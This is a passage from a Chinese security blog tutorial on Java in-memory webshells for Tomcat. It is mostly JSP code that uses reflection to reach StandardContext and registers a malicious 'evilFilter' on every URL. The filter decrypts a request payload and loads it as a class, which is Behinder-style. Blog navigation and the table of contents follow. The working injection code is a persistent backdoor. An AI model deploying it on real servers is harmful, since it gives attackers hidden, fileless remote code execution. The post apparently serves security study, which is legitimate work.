kaaa <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>                        kaaa <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>decodebs<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalBlockSizeException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BadPaddingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="108"></td><td><pre></pre></td></tr><tr><td data-num="109"></td><td><pre>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>                        <span class="token keyword">new</span> <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">g</span><span class="token punctuation">(</span>kaaa<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>                chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token class-name">EvilFilter</span> evilFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token class-name">String</span> name <span class="token operator">=</span><span class="token string">"evilFilter2"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>    <span class="token class-name">PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre>    <span class="token comment">// 获取 ServletContext 对象 (得到的其实是 ApplicationContextFacade 对象)</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>    <span class="token comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>standardContext <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="131"></td><td><pre>        <span class="token comment">// 因为是 StandardContext 对象是私有属性，所以需要用反射去获取</span></pre></td></tr><tr><td data-num="132"></td><td><pre>        <span class="token class-name">Field</span> f <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>        <span class="token class-name">Object</span> object <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="135"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">ServletContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>            servletContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ServletContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">StandardContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>            standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    <span class="token comment">// 通过反射获取 StandardContext 对象的 filterConfigs 属性</span></pre></td></tr><tr><td data-num="142"></td><td><pre>    <span class="token class-name">Field</span> filterConfigsField <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="143"></td><td><pre>    filterConfigsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="144"></td><td><pre>    <span class="token class-name">HashMap</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> filterConfigsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="146"></td><td><pre>        <span class="token comment">// 将 evilFilter 封装成 FilterDef</span></pre></td></tr><tr><td data-num="147"></td><td><pre>        <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="149"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>evilFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>        filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>evilFilter<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>        <span class="token comment">// 动态注册 Filter</span></pre></td></tr><tr><td data-num="152"></td><td><pre>        standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre></pre></td></tr><tr><td data-num="154"></td><td><pre>        <span class="token comment">// 为恶意 Filter 构造 FilterMap</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="157"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre>        filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="159"></td><td><pre></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token comment">// 将我们的 filterMap 放到最前</span></pre></td></tr><tr><td data-num="161"></td><td><pre>        standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>        <span class="token comment">// 通过反射调用 ApplicationFilterConfig 将 filterDef 和 FilterMap 向上一块封装成 FilterConfig</span></pre></td></tr><tr><td data-num="163"></td><td><pre>        <span class="token class-name">Constructor</span>  filterConfigConstructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="164"></td><td><pre>        filterConfigConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="165"></td><td><pre>        <span class="token class-name">FilterConfig</span> filterConfig <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span><span class="token punctuation">)</span> filterConfigConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="166"></td><td><pre>        filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>        printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"inject success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre></pre></td></tr><tr><td data-num="169"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>        printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"wrong,web was have "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">" filter,pleas change a name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="172"></td><td><pre></pre></td></tr><tr><td data-num="173"></td><td><pre></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre></pre></td></tr><tr><td data-num="176"></td><td><pre></pre></td></tr><tr><td data-num="177"></td><td><pre></pre></td></tr><tr><td data-num="178"></td><td><pre></pre></td></tr><tr><td data-num="179"></td><td><pre></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr></table></figure></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-01-03 11:12:41" itemprop="dateModified" datetime="2023-01-03T11:12:41+08:00">2023-01-03</time> </span><span id="2022/11/15/Java内存马1-Servlet-api内存马/" class="item leancloud_visitors" data-flag-title="Java内存马1:servlet-api类型内存马" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>ruyue <i class="ic i-at"><em>@</em></i>如月专注</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2022/11/15/Java%E5%86%85%E5%AD%98%E9%A9%AC1-Servlet-api%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马1:servlet-api类型内存马">http://example.com/2022/11/15/Java内存马1-Servlet-api内存马/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/11/09/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;ruyue-1258558004.cos.ap-guangzhou.myqcloud.com&#x2F;note&#x2F;1.png" title="Java RMI（远程方法调用）漏洞利用"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Java</span><h3>Java RMI（远程方法调用）漏洞利用</h3></a></div><div class="item right"><a href="/2022/11/29/Java%E5%86%85%E5%AD%98%E9%A9%AC1.5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;ruyue-1258558004.cos.ap-guangzhou.myqcloud.com&#x2F;note&#x2F;7.jpg" title="Java内存马1.5:反序列化注入内存马"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Java</span><h3>Java内存马1.5:反序列化注入内存马</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Tomcat 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#servlet%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">Servlet 类型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BE%8B%E5%AD%90"><span class="toc-number">3.1.</span> <span class="toc-text">实现例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#standardcontext%E5%AF%B9%E8%B1%A1%E8%8E%B7%E5%8F%96"><span class="toc-number">3.2.1.</span> <span class="toc-text">StandardContext 对象获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cservlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.2.2.</span> <span class="toc-text">动态注册 Servlet 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%B3%A8%E5%86%8C%E6%88%90%E5%8A%9F%E7%9A%84servlet%E8%BF%9B%E8%A1%8Curl%E6%98%A0%E5%B0%84"><span class="toc-number">3.2.3.</span> <span class="toc-text">将注册成功的 Servlet 进行 URL 映射</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#filter%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">Filter 类型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8Ffilter"><span class="toc-number">4.1.</span> <span class="toc-text">实现恶意 Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter"><span class="toc-number">4.2.</span> <span class="toc-text">动态注册 Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%A6%82%E4%BD%95%E7%BB%91%E5%AE%9Afilter%E5%88%B0chain%E7%9A%84%E6%9C%80%E5%BC%80%E5%A4%B4%E5%B9%B6%E8%AE%A9%E5%85%B6%E7%94%9F%E6%95%88"><span class="toc-number">4.3.</span> <span class="toc-text">分析如何绑定 Filter 到 chain 的最开头并让其生效</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E6%81%B6%E6%84%8Ffilter%E6%9E%84%E9%80%A0filtermap"><span class="toc-number">4.4.</span> <span class="toc-text">为恶意 Filter 构造 FilterMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8addfiltermapbefore%E6%8A%8A%E6%88%91%E4%BB%AC%E7%9A%84%E9%93%BE%E6%94%BE%E5%88%B0%E6%9C%80%E5%89%8D"><span class="toc-number">4.5.</span> <span class="toc-text">使用 addFilterMapBefore 把我们的链放到最前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%8Afilterdef%E5%92%8Cfiltermap%E4%B8%80%E5%9D%97%E5%90%91%E4%B8%8A%E5%B0%81%E8%A3%85%E6%88%90filterconfig"><span class="toc-number">4.6.</span> <span class="toc-text">把 FilterDef 和 FilterMap 一块向上封装成 FilterConfig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8Eput%E8%BF%9Bstandardcontext%E5%AF%B9%E8%B1%A1%E7%9A%84filterconfigs%E5%8D%B3%E5%8F%AF"><span class="toc-number">4.7.</span> <span class="toc-text">最后 put 进 StandardContext 对象的 FilterConfigs 即可</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81"><span class="toc-number">4.8.</span> <span class="toc-text">最终代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#listen%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">Listen 类型内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8Fliesten"><span class="toc-number">5.1.</span> <span class="toc-text">实现恶意 Liesten</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8Clisten"><span class="toc-number">5.2.</span> <span class="toc-text">注册 Listen</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BF%E4%B8%AA%E5%86%B0%E8%9D%8Ewebshell%E5%81%9A%E5%81%9A%E6%B5%8B%E8%AF%95"><span class="toc-number">6.</span> <span class="toc-text">拿个冰蝎 webshell 做做测试</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)-%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80/" rel="bookmark" title="Java反序列化(1)-反射基础">Java反序列化(1)-反射基础</a></li><li><a href="/2022/08/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" rel="bookmark" title="Java反序列化(2)-反序列化基础">Java反序列化(2)-反序列化基础</a></li><li><a href="/2022/09/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(3)-URLDNS%E9%93%BE/" rel="bookmark" title="Java反序列化(3)-URLDNS链">Java反序列化(3)-URLDNS链</a></li><li><a href="/2022/09/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(4)-CC1/" rel="bookmark" title="Java反序列化(4)-CC1">Java反序列化(4)-CC1</a></li><li><a href="/2022/10/06/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="bookmark" title="Java RMI（远程方法调用）漏洞分析">Java RMI（远程方法调用）漏洞分析</a></li><li><a href="/2022/11/09/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="bookmark" title="Java RMI（远程方法调用）漏洞利用">Java RMI（远程方法调用）漏洞利用</a></li><li class="active"><a href="/2022/11/15/Java%E5%86%85%E5%AD%98%E9%A9%AC1-Servlet-api%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Java内存马1:servlet-api类型内存马">Java内存马1:servlet-api类型内存马</a></li><li><a href="/2022/11/29/Java%E5%86%85%E5%AD%98%E9%A9%AC1.5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Java内存马1.5:反序列化注入内存马">Java内存马1.5:反序列化注入内存马</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ruyue" data-src="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><p class="name" itemprop="name">ruyue</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">38</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">11</span> <span class="name">分类</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1eXVlYXR0ZW50aW9u" title="https:&#x2F;&#x2F;github.com&#x2F;ruyueattention"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/11/09/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/11/29/Java%E5%86%85%E5%AD%98%E9%A9%AC1.5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/05/12/docker%E8%AF%86%E5%88%AB/" title="Docker环境探测识别">Docker环境探测识别</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="分类于 密码学">密码学</a></div><span><a href="/2022/03/28/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-%E5%85%AC%E7%A7%81%E9%92%A5%E5%88%9B%E5%BB%BA/" title="非对称密码-公私钥的创建">非对称密码-公私钥的创建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2022/09/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(3)-URLDNS%E9%93%BE/" title="Java反序列化(3)-URLDNS链">Java反序列化(3)-URLDNS链</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2022/10/06/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Java RMI（远程方法调用）漏洞分析">Java RMI（远程方法调用）漏洞分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/02/16/k8s-kunbernetes%E9%83%A8%E7%BD%B2%E5%BA%94%E7%94%A8/" title="k8s-Kubernetes部署应用">k8s-Kubernetes部署应用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="分类于 密码学">密码学</a></div><span><a 